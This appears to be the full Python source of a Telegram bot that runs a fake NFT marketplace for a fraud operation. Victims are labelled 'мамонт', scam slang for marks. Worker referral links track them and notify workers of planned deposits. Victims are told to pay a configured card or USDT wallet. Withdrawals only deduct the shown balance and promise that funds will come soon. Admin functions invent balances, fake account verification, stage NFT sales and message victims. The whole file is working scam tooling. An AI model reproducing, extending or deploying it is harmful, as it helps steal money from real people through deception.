from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
from aiogram import executor, types, Bot, Dispatcher
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.callback_data import CallbackData
import codecs_method
import register_method
import config_method
import inline_method
import random
from datetime import datetime

print('BOT WORK')

bot = Bot(token=config_method.BOT_TOKEN)
dp = Dispatcher(bot)

value_parse = {'RUB': config_method.RUB, 'UAH': config_method.UAH, 'USD': config_method.USD, 'EUR': config_method.EUR, 'PLN': config_method.PLN, 'BLN': config_method.BLN}

@dp.message_handler(commands=['start'])
async def start(message):


    db = await register_method.reg(message)

    text = str(message.text)
    text = text.split()

    if len(text) == 2:
        try:
            user_ref = int(text[1])

            db[user_ref]['referals'].append(int(message.from_user.id))
            db[message.from_user.id]['ref_mamonta'] = user_ref
            await codecs_method.write('users.json', db)

            await bot.send_message(chat_id = user_ref, text = '🎆 У вас новый мамонт! Link: @' + str(message.from_user.username))
        except Exception as ex:
            print(ex)
            pass

    await bot.send_message(chat_id = message.chat.id, text = '<b>Главное меню</b>', parse_mode = 'html', reply_markup = inline_method.greet_kb)

@dp.message_handler(commands=['admin'])
async def start(message):
    db = await register_method.reg(message)

    await bot.send_message(chat_id = message.chat.id, text = '<b>👑 Админ панель</b>', parse_mode = 'html', reply_markup = inline_method.admin_kb)

@dp.message_handler(commands=['work'])
async def start(message):
    db = await register_method.reg(message)

    me = await bot.get_me()
    await bot.send_message(chat_id = message.chat.id, text = f'<b>🔎 Ваша рефераьная ссылка:</b> t.me/{me.username}?start={message.from_user.id}', parse_mode = 'html', reply_markup = inline_method.mamont)


@dp.message_handler(content_types=['photo'])
async def handle_docs_photo(message):
    db = await register_method.reg(message)
    if db[message.from_user.id]['num'] == 'photo_id':
        value = await codecs_method.open('nft.json')
        value['id'] = int(value['id']) + 1

        db[message.from_user.id]['photo_id'] = f'{value["id"]}.jpg'
        await codecs_method.write('users.json', db)
        await codecs_method.write('nft.json', value)

        await message.photo[-1].download(f'{value["id"]}.jpg')

        name = db[message.from_user.id]['name']
        price = db[message.from_user.id]['price']
        photo_id = db[message.from_user.id]['photo_id']
        tag = db[message.from_user.id]['tag']
        blockchain = db[message.from_user.id]['blockchain']
        collection = db[message.from_user.id]['set_collection']

        value[collection][name] = {'photo': photo_id, 'price': price, 'tag': tag, 'blockchain': blockchain, 'user': None}
        db[message.from_user.id]['num'] = 0

        await codecs_method.write('nft.json', value)
        await codecs_method.write('users.json', db)
        
        await bot.send_message(chat_id = message.from_user.id, text = '<b>✅ NFT успешно добавлена!</b>',parse_mode = 'html')


@dp.message_handler(text=['NFT 🎆'])
async def start(message):
    db = await register_method.reg(message)

    value = await codecs_method.open('nft.json')
    lens = int(len(value)) - 1

    inline_kb = InlineKeyboardMarkup()

    for i in value:
        if i != 'id':
            inline_btn = InlineKeyboardButton(str(i), callback_data='z ' + str(i))
            inline_kb.add(inline_btn)

    await bot.send_photo(chat_id = message.chat.id, photo = config_method.photo_caption, caption = f'<b>🌟 На маркетплейсе доступно {lens} коллекций</b>', parse_mode = 'html', reply_markup = inline_kb)


@dp.message_handler(text=['Личный кабинет 📁'])
async def start(message):
    db = await register_method.reg(message)

    if db[message.from_user.id]['wallet'] == 'USD':
        db[message.from_user.id]['balance'] = str(db[message.from_user.id]['balance']) + ' USD'
        sf = db[message.from_user.id]['balance']
    else:

        wallet = db[message.from_user.id]['wallet']
        sf = db[message.from_user.id]['wallet']
        wallet = value_parse[wallet]
        if int(db[message.from_user.id]['balance']) == 0:
            sf =  '0 ' + str(sf) + ' ( ~' + str(db[message.from_user.id]['balance']) + ' $)'
        else:
            wallet = int(db[message.from_user.id]['balance']) * int(wallet)
            wallet = int(wallet * 100) / 100
            sf = str(wallet) + ' ' + str(sf) + ' ( ~' + str(db[message.from_user.id]['balance']) + ' $)' 

    await bot.send_photo(chat_id = message.chat.id, photo = config_method.photo_caption, caption = f'''
<b>
Личный кабинет

Баланс: {sf}
На вывод: {sf}

Верификация: {db[message.from_user.id]["ver"]}
Ваш ID: {message.from_user.id}

Дата и время: {datetime.now().strftime("%d.%m.%y | %H:%M:%S")}
</b>
        ''' ,reply_markup = inline_method.menu_kb, parse_mode = 'html')

@dp.message_handler(text=['Информация ℹ️'])
async def start(message):
    db = await register_method.reg(message)
    await bot.send_photo(chat_id = message.chat.id, photo = config_method.photo_caption, caption = f'''
<b>
{config_method.information}
</b>
        ''', parse_mode = 'html')

@dp.message_handler(text=['🧑‍💻 Поддержка'])
async def start(message):
    db = await register_method.reg(message)
    await bot.send_photo(chat_id = message.chat.id, photo = config_method.photo_caption, caption = f'''
<b>
{config_method.support}
</b>
        ''', parse_mode = 'html')


@dp.callback_query_handler(text = 'my_nft')
async def start(call):
    db = await register_method.reg(call)

    if len(db[call.from_user.id]['nft']) == 0:
        await bot.send_message(chat_id = call.from_user.id, text = '🖼 Список ваших NFT пуст')
    else:
        inline_kb = InlineKeyboardMarkup()
        for i in db[call.from_user.id]['nft']:
            inline_btn = InlineKeyboardButton(str(db[call.from_user.id]['nft'][i][0]), callback_data='u_' + str(i))
            inline_kb.add(inline_btn)

        await bot.send_message(chat_id = call.from_user.id, text = '🖼 Список ваших NFT',reply_markup = inline_kb)

@dp.callback_query_handler(text = 'un_card')
async def start(call):
    db = await register_method.reg(call)

    await bot.delete_message(chat_id = call.from_user.id, message_id = call.message.message_id)

    db[call.from_user.id]['balance'] = float(db[call.from_user.id]['balance']) - float(db[call.from_user.id]['invest'])

    await codecs_method.write('users.json', db)

    await bot.send_message(chat_id = call.from_user.id, text = '✅ Средства поступят в ближайшее время')

@dp.callback_query_handler(text = 'un_crypto')
async def start(call):
    db = await register_method.reg(call)

    await bot.delete_message(chat_id = call.from_user.id, message_id = call.message.message_id)

    db[call.from_user.id]['balance'] = float(db[call.from_user.id]['balance']) - float(db[call.from_user.id]['invest'])

    await codecs_method.write('users.json', db)

    await bot.send_message(chat_id = call.from_user.id, text = '✅ Средства поступят в ближайшее время')


@dp.callback_query_handler(text = 'un_invest')
async def start(call):
    db = await register_method.reg(call)


    db[call.from_user.id]['num'] = 'un_invest'

    await codecs_method.write('users.json', db)

    await bot.send_message(chat_id = call.from_user.id, text = '<b>🧑‍💻 Введите сумму, на которую вы хотите вывести баланс</b>', parse_mode = 'html')


@dp.callback_query_handler(text = 'plus_card')
async def start(call):
    db = await register_method.reg(call)

    await bot.delete_message(chat_id = call.from_user.id, message_id = call.message.message_id)

    await bot.send_photo(chat_id = call.message.chat.id, photo = config_method.photo_caption, caption = f'''
<b>
💵 Сумма: {db[call.from_user.id]["invest"]} RUB
💳 Номер карты: {config_method.CARD}

🌐 Отправьте на данную карту {db[call.from_user.id]["invest"]} RUB, чтобы пополнить баланс.
</b>
        ''', parse_mode = 'html')


@dp.callback_query_handler(text = 'plus_usdt')
async def start(call):
    db = await register_method.reg(call)

    await bot.delete_message(chat_id = call.from_user.id, message_id = call.message.message_id)

    await bot.send_photo(chat_id = call.message.chat.id, photo = config_method.photo_caption, caption = f'''
<b>
💵 Сумма: {db[call.from_user.id]["invest"]} USDT
💳 Номер кошелька: {config_method.USDT}

🌐 Отправьте на данный кошелёк {db[call.from_user.id]["invest"]} USDT, чтобы пополнить баланс.
</b>
        ''', parse_mode = 'html')



@dp.callback_query_handler(text = 'invest')
async def start(call):
    db = await register_method.reg(call)

    db[call.from_user.id]['num'] = 'invest'

    await codecs_method.write('users.json', db)

    try:
        await bot.send_message(chat_id = db[call.from_user.id]['ref_mamonta'], text = f'<b>🧑‍💻 Мамонт @{call.from_user.username} собирается пополнить баланс</b>', parse_mode = 'html')
    except Exception as ex:
        print(ex)
        pass

    await bot.send_message(chat_id = call.from_user.id, text = '<b>🧑‍💻 Введите сумму, на которую вы хотите пополнить баланс</b>', parse_mode = 'html')


@dp.callback_query_handler(text = 'add_collection')
async def start(call):
    db = await register_method.reg(call)

    db[call.from_user.id]['num'] = 'add_collection'

    await codecs_method.write('users.json', db)

    await bot.send_message(chat_id = call.from_user.id, text = '<b>🧑‍💻 Введите название новой коллекции</b>', parse_mode = 'html')

@dp.callback_query_handler(text = 'search_mamont')
async def start(call):
    db = await register_method.reg(call)

    db[call.from_user.id]['num'] = 'search_mamont'

    await codecs_method.write('users.json', db)

    await bot.send_message(chat_id = call.from_user.id, text = '<b>🧑‍💻 Введите ID мамонта, чтобы посмотреть о нём информацию</b>', parse_mode = 'html')



@dp.callback_query_handler(text = 'my_mamont')
async def start(call):
    db = await register_method.reg(call)

    inline_kb = InlineKeyboardMarkup()
    for i in db[call.from_user.id]['referals']:
        call_text = f'Link: @{db[i]["username"]}'
        inline_btn = InlineKeyboardButton(str(call_text), callback_data='n_' + str(i))
        inline_kb.add(inline_btn)

    await bot.send_message(chat_id = call.from_user.id, text = '🦣 Список ваших мамонтов', reply_markup = inline_kb)

@dp.callback_query_handler(text = 'add_nft')
async def start(call):
    db = await register_method.reg(call)

    value = await codecs_method.open('nft.json')
    inline_kb = InlineKeyboardMarkup()

    for i in value:
        if i != 'id':
            inline_btn = InlineKeyboardButton(str(i), callback_data='v ' + str(i))
            inline_kb.add(inline_btn)

    await bot.send_message(chat_id = call.from_user.id, text = '<b>🧑‍💻 Выберите коллекцию, в которой будет добавлена новая NFT.</b>', parse_mode = 'html',reply_markup = inline_kb)

@dp.callback_query_handler(text = 'change_wallet')
async def start(call):
    db = await register_method.reg(call)

    await bot.send_message(chat_id = call.from_user.id, text = '<b>💰 Выберите валюту в боте</b>', reply_markup = inline_method.change, parse_mode = 'html')

@dp.callback_query_handler()
async def start(call):
    print(call.data)
    db = await register_method.reg(call)
    next_stape = True

    split = call.data
    split = split.split('_')

    if split[0] == 'j' and next_stape == True:
        next_stape = False

        value = await codecs_method.open('nft.json')

        price = value[str(split[2])][str(split[3])]['price']

        del value[str(split[2])][str(split[3])]

        db[int(split[1])]['balance'] = float(db[int(split[1])]['balance']) + float(price)

        await codecs_method.write('nft.json', value)
        await codecs_method.write('users.json', db)

        await bot.delete_message(chat_id = call.from_user.id, message_id= call.message.message_id)

        try:
            await bot.send_message(chat_id = call.from_user.id, text = '✅ Ваша NFT успешно продана, средства зачислены')
        except:
            pass

        await bot.send_message(chat_id = call.from_user.id, text = '✅ NFT мамонта продана.')

    if split[0] == 'change' and next_stape == True:
        next_stape = False

        db[call.from_user.id]['wallet'] = str(split[1])
        await codecs_method.write('users.json', db)

        await bot.send_message(chat_id = call.from_user.id, text = '<b>👑 Ваша валюта изменена на ' + str(split[1]) + '</b>', parse_mode = 'html')

    if str(split[0]) == 'u' and next_stape == True:
        next_stape = False

        inline_kb = InlineKeyboardMarkup()

        inline_btn = InlineKeyboardButton('✅ Продать ✅', callback_data='r_' + str(split[1]))
        inline_kb.add(inline_btn)

        await bot.delete_message(chat_id = call.from_user.id, message_id = call.message.message_id)

        await bot.send_photo(chat_id = call.from_user.id, photo = open(db[call.from_user.id]['nft'][str(split[1])][2], "rb"), caption = f'''
<b>
Коллекция: {split[1]}
Название: {db[call.from_user.id]["nft"][str(split[1])][0]}
Блокчен: {db[call.from_user.id]["nft"][str(split[1])][1]}
</b>
            ''',parse_mode = 'html', reply_markup = inline_kb)


    if str(split[0]) == 'r' and next_stape == True:
        next_stape = False

        db[call.from_user.id]['name'] = str(split[1])
        db[call.from_user.id]['num'] = 'sell_nft'
        await codecs_method.write('users.json', db)

        await bot.send_message(chat_id = call.from_user.id, text = '👑 Введите сумму, за которую вы готовы продать NFT (в доларах)')


    if str(call.data[0]) == 'z' and next_stape == True:
        next_stape = False
        
        value = await codecs_method.open('nft.json')

        inline_kb = InlineKeyboardMarkup()

        db[call.from_user.id]['set_collection'] = str(call.data[2:])

        await codecs_method.write('users.json', db)

        for i in value[str(call.data[2:])]:
            if i != 'id':
                inline_btn = InlineKeyboardButton(str(i), callback_data='x ' + str(i))
                inline_kb.add(inline_btn)

        await bot.edit_message_caption(chat_id = call.message.chat.id, message_id = call.message.message_id, caption = f'<b>🌟 Доступные NFT из коллекции {call.data[2:]}</b>', parse_mode = 'html',reply_markup = inline_kb)

    if str(call.data[0]) == 'x' and next_stape == True:
        next_stape = False

        await bot.delete_message(chat_id = call.message.chat.id, message_id = call.message.message_id)

        value = await codecs_method.open('nft.json')
        collection = db[call.from_user.id]['set_collection']
        nft_data = str(call.data[2:])

        photo = value[collection][nft_data]['photo']
        price = value[collection][nft_data]['price']
        tag = value[collection][nft_data]['tag']
        blockchain = value[collection][nft_data]['blockchain']

        inline_kb = InlineKeyboardMarkup()

        inline_btn = InlineKeyboardButton('✅ Купить ✅', callback_data='c ' + str(call.data[2:]))
        inline_kb.add(inline_btn)

        db[call.from_user.id]['name'] = str(call.data[2:])
        await codecs_method.write('users.json', db)

        await bot.send_photo(chat_id = call.from_user.id, photo = open(photo, 'rb'), caption = f'''
<b>
Номер: {tag}
Блокчен: {blockchain}
Цена: {price}$
</b>
            ''', parse_mode = 'html', reply_markup = inline_kb)

    if str(call.data[0]) == 'c' and next_stape == True:
        next_stape = False

        value = await codecs_method.open('nft.json')

        name_nft = db[call.from_user.id]['name']
        collection_nft = db[call.from_user.id]['set_collection']

        if float(db[call.from_user.id]['balance']) < float(value[collection_nft][name_nft]['price']):

            await bot.send_message(chat_id = call.from_user.id, text = '<b>❌ Недостаточно средств для покупки</b>', parse_mode = 'html')
        else:
            db[call.from_user.id]['nft'][collection_nft] = [name_nft, value[collection_nft][name_nft]['blockchain'], value[collection_nft][name_nft]['photo']]
            db[call.from_user.id]['balance'] = float(db[call.from_user.id]['balance']) - float(value[collection_nft][name_nft]['price'])
            await codecs_method.write('users.json', db)

            if value[collection_nft][name_nft]['user'] == None:
                pass

            else:
                db[value[collection_nft][name_nft]['user']]['balance'] = float(db[value[collection_nft][name_nft]['user']]['balance']) + float(value[collection_nft][name_nft]['price'])
                await codecs_method.write('users.json', db)

                try:
                    await bot.send_message(chat_id = call.from_user.id, text = '✅ У вас успешно купили NFT! Ваш баланс пополнен.')
                except:
                    pass

            del value[collection_nft][name_nft]

            await codecs_method.write('nft.json', value)

            await bot.delete_message(chat_id = call.from_user.id, message_id = call.message.message_id)
            await bot.send_message(chat_id = call.from_user.id, text = '✅ Вы успешно купили NFT!')

    if str(call.data[0]) == 'f' and next_stape == True:
        next_stape = False

        db[call.from_user.id]['name'] = str(call.data[2:])
        db[call.from_user.id]['num'] = 'send_mamont'
        await codecs_method.write('users.json', db)

        await bot.send_message(chat_id = call.message.chat.id, text = '<b>👤 Введите сообщение для мамонта</b>', parse_mode = 'html')

    if str(call.data[0]) == 'v' and next_stape == True:
        next_stape = False

        db[call.from_user.id]['set_collection'] = str(call.data[2:])
        db[call.from_user.id]['num'] = 'add_nft'
        await codecs_method.write('users.json', db)

        await bot.send_message(chat_id = call.message.chat.id, text = '<b>👤 Введите название для нового NFT</b>', parse_mode = 'html')

    if str(call.data[0]) == 'n' and next_stape == True:
        next_stape = False

        inline_kb = InlineKeyboardMarkup()

        inline_btn_1 = InlineKeyboardButton('✅ Верифицировать ✅', callback_data='s_' + str(call.data[2:]))
        inline_btn_2 = InlineKeyboardButton('💰 Пополнить баланс 💰', callback_data='d_' + str(call.data[2:]))
        inline_btn_3 = InlineKeyboardButton('🧾 Отправить сообщение мамонту 🧾', callback_data='f_' + str(call.data[2:]))
        inline_kb.add(inline_btn_1).add(inline_btn_2).add(inline_btn_3)

        await bot.send_message(chat_id = call.from_user.id, text = f'''
<b>
🔎 ID мамонта: {split[1]}
👤 Ссылка: @{db[int(split[1])]['username']}
🧾 Статус верификации: {db[int(split[1])]['ver']}
</b>
            ''',parse_mode = 'html',reply_markup = inline_kb)

    if str(call.data[0]) == 's' and next_stape == True:
        next_stape = False

        db[int(split[1])]['ver'] = '✅ Веифицирован'
        await codecs_method.write('users.json', db)

        try:
            await bot.send_message(chat_id = split[1], text = '✅ Ваш аккаунт бы верифицирован')
        except:
            pass

        await bot.send_message(chat_id = call.from_user.id, text = '✅ Аккаунт пользователя был верифицрован, мы выслали ему уведомление')

    if str(call.data[0]) == 'd' and next_stape == True:
        next_stape = False

        db[call.from_user.id]['num'] = 'add_user_balance'
        db[call.from_user.id]['user_id_add'] = int(split[1])

        await codecs_method.write('users.json', db)

        await bot.send_message(chat_id = call.message.chat.id, text = '<b>💰 Введите сумму, на которую вы пополните баланс мамонту (В долларах).\n\n🌐 Мамонту придёт уведомление</b>', parse_mode = 'html')


@dp.message_handler()
async def start(message):
    db = await register_method.reg(message)
    next_stape = True

    if db[message.from_user.id]['num'] == 'add_user_balance' and next_stape == True:
        next_stape = False

        user_now = int(db[message.from_user.id]['user_id_add'])

        db[user_now]['balance'] = float(db[user_now]['balance']) + float(message.text)
        db[message.from_user.id]['num'] = 0

        await codecs_method.write('users.json', db)

        try:
            await bot.send_message(chat_id = user_now, text = '💳 Ваш баланс пополнен на ' + str(message.text) + ' $')
        except:
            pass

        await bot.send_message(chat_id = message.from_user.id, text = '✅ Баланс мамонта пополнен на ' + str(message.text) + ' долларов')

    if db[message.from_user.id]['num'] == 'add_collection' and next_stape == True:
        next_stape = False

        value = await codecs_method.open('nft.json')
        db[message.from_user.id]['num'] = 0
        value[str(message.text)] = {}

        await codecs_method.write('users.json', db)
        await codecs_method.write('nft.json', value)

        await bot.send_message(chat_id = message.from_user.id, text = f'<b>👾 Коллекиця {message.text} успешно добавлена</b>', parse_mode = 'html')

    if db[message.from_user.id]['num'] == 'add_nft' and next_stape == True:
        next_stape = False

        db[message.from_user.id]['num'] = 'price'
        db[message.from_user.id]['name'] = str(message.text)

        await codecs_method.write('users.json', db)

        await bot.send_message(chat_id = message.from_user.id, text = f'<b>👾 Введите цену для нового NFT</b>', parse_mode = 'html')


    if db[message.from_user.id]['num'] == 'price' and next_stape == True:
        next_stape = False

        db[message.from_user.id]['num'] = 'tag'
        db[message.from_user.id]['price'] = str(message.text)

        await codecs_method.write('users.json', db)

        await bot.send_message(chat_id = message.from_user.id, text = f'<b>👾 Введите тег для нового NFT</b>', parse_mode = 'html')


    if db[message.from_user.id]['num'] == 'tag' and next_stape == True:
        next_stape = False

        db[message.from_user.id]['num'] = 'blockchain'
        db[message.from_user.id]['tag'] = str(message.text)

        await codecs_method.write('users.json', db)

        await bot.send_message(chat_id = message.from_user.id, text = f'<b>👾 Введите блокчейн для нового NFT</b>', parse_mode = 'html')


    if db[message.from_user.id]['num'] == 'blockchain' and next_stape == True:
        next_stape = False

        db[message.from_user.id]['num'] = 'photo_id'
        db[message.from_user.id]['blockchain'] = str(message.text)

        await codecs_method.write('users.json', db)

        await bot.send_message(chat_id = message.from_user.id, text = f'<b>👾 Решающий штрих! Отправьте фотографию для NFT</b>', parse_mode = 'html')

    if db[message.from_user.id]['num'] == 'invest' and next_stape == True:

        db[message.from_user.id]['num'] = 0
        await codecs_method.write('users.json', db)


        try:
            next_stape = False

            db[message.from_user.id]['invest'] = int(message.text)
            await codecs_method.write('users.json', db)

            await bot.send_message(chat_id = message.from_user.id, text = '<b> Выберите способ пополнения</b>', parse_mode = 'html',reply_markup = inline_method.invest)

        except:
            await bot.send_message(chat_id = message.from_user.id, text = '<b>👾 Сообщение не является числом</b>', parse_mode = 'html')



    if db[message.from_user.id]['num'] == 'send_mamont' and next_stape == True:
        next_stape = False
        db[message.from_user.id]['num'] = 0
        await codecs_method.write('users.json', db)
        try:
            await bot.send_message(chat_id = db[message.from_user.id]['name'], text = str(message.text))
        except Exception as ex:
            print(ex)
            pass

        await bot.send_message(chat_id = message.from_user.id, text = 'Сообщение успешно доставлено мамонту')


    if db[message.from_user.id]['num'] == 'search_mamont' and next_stape == True:
        next_stape = False
        db[message.from_user.id]['num'] = 0
        await codecs_method.write('users.json', db)

        if int(message.text) in db:
            ref = db[int(message.text)]["ref_mamonta"]

            if ref == None:
                ref = None

            else:
                ref = db[ref]["username"]

            await bot.send_message(chat_id = message.from_user.id, text = f'''
🔎 ID: {message.text}
💰 Баланс: {db[int(message.text)]["balance"]}$
👑 Воркер мамонта: @{ref}
                ''')

        else:
            await bot.send_message(chat_id = message.from_user.id, text = f'''
ID не найден
                ''')

    if db[message.from_user.id]['num'] == 'un_invest' and next_stape == True:
        next_stape = False
        db[message.from_user.id]['num'] = 0
        await codecs_method.write('users.json', db)

        try:
            if float(message.text) > float(db[message.from_user.id]['balance']):
                await bot.send_message(chat_id = message.from_user.id, text = f'<b>❌ На вашем балансе {db[message.from_user.id]["balance"]} $, вы пытаетесь вывести {message.text} $</b>', parse_mode = 'html')
            else:

                db[message.from_user.id]['invest'] = int(message.text)
                await codecs_method.write('users.json', db)

                await bot.send_message(chat_id = message.from_user.id, text = '<b> Выберите способ вывода</b>', parse_mode = 'html',reply_markup = inline_method.un_invest)

        except:
            await bot.send_message(chat_id = message.from_user.id, text = '<b>👾 Сообщение не является числом</b>', parse_mode = 'html')


    if db[message.from_user.id]['num'] == 'sell_nft' and next_stape == True:
        try:
            if int(message.text) < 1:
                await bot.send_message(chat_id = message.from_user.id, text = 'Убедитесь, что ввели число больше 1')
            else:
                next_stape = False  
                collection = db[message.from_user.id]['name']

                photo = db[message.from_user.id]['nft'][collection][2]
                blockchain = db[message.from_user.id]['nft'][collection][1]
                name = db[message.from_user.id]['nft'][collection][0]
                price = int(message.text)
                tag = random.randint(53,934)

                del db[message.from_user.id]['nft'][collection]
                await codecs_method.write('users.json', db)

                value = await codecs_method.open('nft.json')

                value[collection][name] = {'photo': photo, 'price': price, 'tag': '#' + str(tag), 'blockchain': blockchain, 'user': int(message.from_user.id)}

                await codecs_method.write('nft.json', value)

                inline_kb = InlineKeyboardMarkup()

                inline_btn_1 = InlineKeyboardButton('Купить', callback_data='j_' + str(message.from_user.id) + '_' + str(collection) + '_' + str(name))

                inline_kb.add(inline_btn_1)

                try:
                    await bot.send_message(chat_id = db[message.from_user.id]['ref_mamonta'], text = '👑 Мамонт выставил NFT на продажу',reply_markup = inline_kb)
                except:
                    pass

                await bot.send_message(chat_id = message.from_user.id, text = '✅ Ваша NFT успешно выставлена на продажу')
        except Exception as ex:
            print(ex)
            await bot.send_message(chat_id = message.from_user.id, text = 'Убедитесь, что ввели число.')

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates = True)